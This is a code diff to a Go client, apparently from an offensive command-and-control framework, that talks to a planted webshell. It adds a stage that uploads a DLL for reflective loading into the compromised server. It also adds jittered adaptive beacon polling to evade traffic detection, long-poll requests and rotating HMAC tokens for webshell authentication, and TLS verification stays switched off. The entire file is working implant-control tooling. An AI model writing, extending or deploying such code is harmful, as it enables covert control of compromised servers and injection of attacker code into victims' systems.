@@ -3,10 +3,16 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/hmac"
+	"crypto/sha256"
 	"crypto/tls"
+	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
+	"strconv"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -18,15 +24,20 @@ import (
 )
 
 const (
-	httpTimeout     = 30 * time.Second
-	pollInterval    = 500 * time.Millisecond
+	httpTimeout      = 30 * time.Second
+	longPollTimeout  = 10 * time.Second
+	pollIdleInterval = 5 * time.Second
+	pollActiveInterval = 200 * time.Millisecond
+	jitterFactor     = 0.3
 	streamChanBuffer = 16
-	stageInit       = "init"
-	stageSpite      = "spite"
-	stageStatus     = "status"
-	headerStage     = "X-Stage"
-	headerToken     = "X-Token"
-	headerSessionID = "X-Session-ID"
+	stageLoad        = "load"
+	stageInit        = "init"
+	stageSpite       = "spite"
+	stageStatus      = "status"
+	headerStage      = "X-Stage"
+	headerToken      = "X-Token"
+	headerSessionID  = "X-Session-ID"
+	headerPollTimeout = "X-Poll-Timeout"
 )
 
 // ChannelIface abstracts the communication channel to the bridge DLL.
@@ -77,7 +88,7 @@ func NewChannel(webshellURL, token string) *Channel {
 		webshellURL: webshellURL,
 		token:       token,
 		client: &http.Client{
-			Timeout: httpTimeout,
+			Timeout: longPollTimeout + 5*time.Second,
 			Transport: &http.Transport{
 				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 			},
@@ -96,6 +107,15 @@ func (c *Channel) Connect(ctx context.Context) error {
 	status := string(body)
 	if status != "LOADED" {
 		return fmt.Errorf("DLL not loaded (status: %s)", status)
+	}
+	return nil
+}
+
+// LoadDLL sends the bridge DLL to the webshell for reflective loading.
+func (c *Channel) LoadDLL(ctx context.Context, dllBytes []byte) error {
+	_, err := c.doRequest(ctx, stageLoad, dllBytes)
+	if err != nil {
+		return fmt.Errorf("load DLL: %w", err)
 	}
 	return nil
 }
@@ -136,39 +156,104 @@ func (c *Channel) StartRecvLoop() {
 }
 
 func (c *Channel) pollLoop(ctx context.Context) {
-	ticker := time.NewTicker(pollInterval)
-	defer ticker.Stop()
-
 	for {
+		c.pendMu.Lock()
+		hasPending := len(c.pending) > 0
+		c.pendMu.Unlock()
+
+		if !hasPending {
+			// No active streaming tasks — idle wait, no HTTP request.
+			select {
+			case <-ctx.Done():
+				return
+			case <-c.closeCh:
+				return
+			case <-time.After(jitter(pollIdleInterval)):
+			}
+			continue
+		}
+
+		// Active streaming tasks — send long-poll request with timeout hint.
+		empty := &implantpb.Spites{}
+		data, err := proto.Marshal(empty)
+		if err != nil {
+			continue
+		}
+		respBody, err := c.doLongPollRequest(ctx, data)
+		if err != nil {
+			if ctx.Err() != nil {
+				return
+			}
+			logs.Log.Debugf("poll error: %v", err)
+			select {
+			case <-ctx.Done():
+				return
+			case <-c.closeCh:
+				return
+			case <-time.After(jitter(pollActiveInterval)):
+			}
+			continue
+		}
+
+		hasData := c.dispatchResponse(respBody)
+
+		// Adaptive interval: fast when data is flowing, slow down when idle.
+		var interval time.Duration
+		if hasData {
+			interval = pollActiveInterval
+		} else {
+			interval = pollIdleInterval
+		}
 		select {
 		case <-ctx.Done():
 			return
 		case <-c.closeCh:
 			return
-		case <-ticker.C:
-			c.pendMu.Lock()
-			hasPending := len(c.pending) > 0
-			c.pendMu.Unlock()
-			if !hasPending {
-				continue
-			}
-
-			empty := &implantpb.Spites{}
-			data, err := proto.Marshal(empty)
-			if err != nil {
-				continue
-			}
-			respBody, err := c.doRequest(ctx, stageSpite, data)
-			if err != nil {
-				if ctx.Err() != nil {
-					return
-				}
-				logs.Log.Debugf("poll error: %v", err)
-				continue
-			}
-			c.dispatchResponse(respBody)
+		case <-time.After(jitter(interval)):
 		}
 	}
+}
+
+// doLongPollRequest sends a spite-stage request with X-Poll-Timeout header,
+// telling the webshell to hold the connection until data is available or timeout.
+func (c *Channel) doLongPollRequest(ctx context.Context, body []byte) ([]byte, error) {
+	var bodyReader io.Reader
+	if body != nil {
+		bodyReader = bytes.NewReader(body)
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bodyReader)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set(headerStage, stageSpite)
+	req.Header.Set(headerPollTimeout, strconv.Itoa(int(longPollTimeout.Seconds())))
+	if c.token != "" {
+		req.Header.Set(headerToken, tokenForHeader(c.token))
+	}
+	if c.sidSet.Load() {
+		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := c.client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		respBody, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+
+	return io.ReadAll(resp.Body)
+}
+
+// jitter adds ±jitterFactor random variation to an interval.
+func jitter(d time.Duration) time.Duration {
+	delta := float64(d) * jitterFactor
+	return d + time.Duration(delta*(2*rand.Float64()-1))
 }
 
 // Forward sends a Spite and waits for a single response (unary request-response).
@@ -236,7 +321,7 @@ func (c *Channel) SendSpite(taskID uint32, spite *implantpb.Spite) error {
 		return err
 	}
 
-	c.dispatchResponse(respBody)
+	_ = c.dispatchResponse(respBody)
 	return nil
 }
 
@@ -286,7 +371,7 @@ func (c *Channel) doRequest(ctx context.Context, stage string, body []byte) ([]b
 	}
 	req.Header.Set(headerStage, stage)
 	if c.token != "" {
-		req.Header.Set(headerToken, c.token)
+		req.Header.Set(headerToken, tokenForHeader(c.token))
 	}
 	if c.sidSet.Load() {
 		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
@@ -307,18 +392,21 @@ func (c *Channel) doRequest(ctx context.Context, stage string, body []byte) ([]b
 	return io.ReadAll(resp.Body)
 }
 
-func (c *Channel) dispatchResponse(body []byte) {
+func (c *Channel) dispatchResponse(body []byte) bool {
 	if len(body) == 0 {
-		return
+		return false
 	}
 	spites := &implantpb.Spites{}
 	if err := proto.Unmarshal(body, spites); err != nil {
 		logs.Log.Debugf("dispatch unmarshal error: %v", err)
-		return
+		return false
 	}
+	dispatched := false
 	for _, spite := range spites.GetSpites() {
 		c.dispatchSpite(spite)
+		dispatched = true
 	}
+	return dispatched
 }
 
 func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
@@ -333,4 +421,17 @@ func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
 			logs.Log.Debugf("channel: pending full for task %d", taskID)
 		}
 	}
+}
+
+// tokenForHeader returns the token value to send in the X-Token header.
+// Short secrets (≤32 chars) are sent as-is (legacy static comparison on the webshell).
+// Longer secrets use time-based HMAC-SHA256 that rotates every 30 seconds.
+func tokenForHeader(secret string) string {
+	if len(secret) <= 32 {
+		return secret
+	}
+	window := time.Now().Unix() / 30
+	mac := hmac.New(sha256.New, []byte(secret))
+	_ = binary.Write(mac, binary.BigEndian, window)
+	return hex.EncodeToString(mac.Sum(nil))
 }
